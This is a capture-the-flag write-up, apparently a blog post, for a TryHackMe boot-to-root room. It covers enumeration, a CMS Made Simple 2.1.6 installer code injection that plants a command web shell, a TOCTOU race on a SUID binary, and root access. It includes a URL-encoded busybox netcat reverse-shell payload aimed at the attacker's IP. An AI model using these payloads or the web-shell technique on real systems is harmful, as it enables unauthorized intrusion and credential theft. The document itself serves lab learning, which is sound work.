---
layout: posts
title: "TOCTOU CTF Writeup"
date: 2025-12-31
categories: writeups
tags: Linux Boot2Root Web TOCTOU 
exerpt: It's a setup... Can you get the flags in time?
difficulty: Medium
---


# TOC2 CTF – Write Up

**Difficulty:** {{page.difficulty}} | **Focus:** {{ page.tags | join: ', ' }}.

Room link: https://tryhackme.com/room/toc2


It's a setup... Can you get the flags in time?

## 1. Initial Enumeration
We begin the engagement with an nmap scan to identify open ports and services on the target machine.

The scan reveals two open ports:

* Port 22: SSH
* Port 80: HTTP (Web Server)

<div class="post-img"><img src="/assets/img/toc2/nmap.png" alt="Alt text"></div>

## 2. Web Discovery & Directory Bruteforcing
Navigating to the website, we find an "Under Construction" page. While it mentions some potential credentials, their application isn't immediately clear. To uncover hidden paths, I ran gobuster for directory bruteforcing.

<div class="post-img"><img src="/assets/img/toc2/website_username_pass.png" alt="Alt text"></div>

<div class="post-img"><img src="/assets/img/toc2/gobuster.png" alt="Alt text"></div>

The scan identifies a **robots.txt** file. Inspecting its contents reveals an interesting installation path: 

* **hxxp[://]10.48.164.165/cmsms/cmsms-2.1.6-install.php**

<div class="post-img"><img src="/assets/img/toc2/robots.png" alt="Alt text"></div>

## 3. Vulnerability Research
The discovered directory leads to the CMS Made Simple 2.1.6 installation wizard. Researching known vulnerabilities for this version leads to EDB-ID: 44192.

* **hxxps[://]www.exploit-db[.]com/exploits/44192**

The exploit involves Remote Code Execution (RCE) by injecting arbitrary PHP code into the config.php file during the installation process. By providing valid database credentials and injecting code into the timezone parameter during Step 4, we can achieve persistence in the configuration file.

## 4. Exploitation & Initial Access
Using the database credentials found during the installation steps, I injected a PHP system() function into the timezone field.

<div class="post-img"><img src="/assets/img/toc2/exploit.png" alt="Alt text"></div>

To verify the exploit, I accessed the newly created config.php with a command parameter

* **hxxp[://]10.48.164.165/cmsms/config.php?cmd=id**

<div class="post-img"><img src="/assets/img/toc2/id_exploit.png" alt="Alt text"></div>

## 5. Gaining a Reverse Shell
With RCE confirmed, the next step is to catch a reverse shell. I started a netcat listener on my local machine and executed the following payload via the browser

* **busybox%20nc%2010.48.83.150%204444%20-e%20%2Fbin%2Fbash**

<div class="post-img"><img src="/assets/img/toc2/reverse_shell.png" alt="Alt text"></div>

Shell Stabilization
Once connected, I stabilized the shell to allow for better interactivity. I followed the methods outlined in this guide:

* **hxxps[://]infosecwriteups[.]com/how-to-stabilise-a-reverse-shell-using-python-da2f51c42b85**

## 6. Lateral Movement: User Frank
Enumerating the **/home** directory reveals a user named **frank**. We have read access to his home directory.

Inside, we find **user.txt** (the first flag) and a file named **new_machine.txt**. The note explains that Frank was assigned a new Thinkpad and reveals a "default password" used for work machines. Using these credentials, I switched users to Frank

<div class="post-img"><img src="/assets/img/toc2/frank.png" alt="Alt text"></div>
<div class="post-img"><img src="/assets/img/toc2/frank_pass.png" alt="Alt text"></div>
<div class="post-img"><img src="/assets/img/toc2/eleavate_frank.png" alt="Alt text"></div>

## 7. Privilege Escalation: TOCTOU Attack
In Frank's home directory is a folder named root_access containing a SUID binary called **readcreds** and its source code, **readcreds.c**.

The program checks if the user has permission to read a file before opening it. However, this creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. I used the following resources to understand and execute the exploit:

* **Exploit Code: hxxps[://]github[.]com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c**

* **TOCTOU Concepts: hxxps[://]heinosass[.]gitbook[.]io/leet-sheet/binary-exploitation/time-of-check-to-time-of-use-toctou**


<div class="post-img"><img src="/assets/img/toc2/setup_toctou.png" alt="Alt text"></div>

By rapidly swapping a file I could read with the root password backup file between the program's "check" and "read" actions, I successfully retrieved the Root Credentials.


<div class="post-img"><img src="/assets/img/toc2/root_creds.png" alt="Alt text"></div>

## 8. Final Flag
With the root password, I logged in as root and captured the final flag.


<div class="post-img"><img src="/assets/img/toc2/roottxt.png" alt="Alt text"></div>